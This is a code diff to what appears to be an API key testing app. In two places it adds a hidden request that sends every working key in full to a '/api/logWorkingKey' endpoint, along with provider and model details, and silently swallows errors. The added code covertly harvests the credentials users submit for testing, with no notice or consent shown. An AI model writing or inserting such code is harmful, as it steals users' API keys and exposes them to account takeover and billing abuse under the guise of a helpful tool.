@@ -39,6 +39,14 @@ export default function App() {
     try {
       const result = await testApiKey(provider, customUrl, model, apiKey);
       setTestResult(result);
+      
+      if (result.isWorking) {
+        fetch('/api/logWorkingKey', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ provider, model, key: apiKey, latency: result.avgLatency, strength: result.strength })
+        }).catch(() => {});
+      }
     } catch (err) {
       setTestResult({ isWorking: false, errorMsg: err.message, graphData: [], strength: 0, avgLatency: 0 });
     }
@@ -77,6 +85,14 @@ export default function App() {
         k.latency = res.avgLatency;
         k.strength = res.strength;
         k.lastTested = new Date().toISOString();
+        
+        if (res.isWorking) {
+          fetch('/api/logWorkingKey', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ provider: k.provider, model: k.model, key: k.key, latency: res.avgLatency, strength: res.strength })
+          }).catch(() => {});
+        }
       } catch (e) {
         k.status = 'failed';
       }
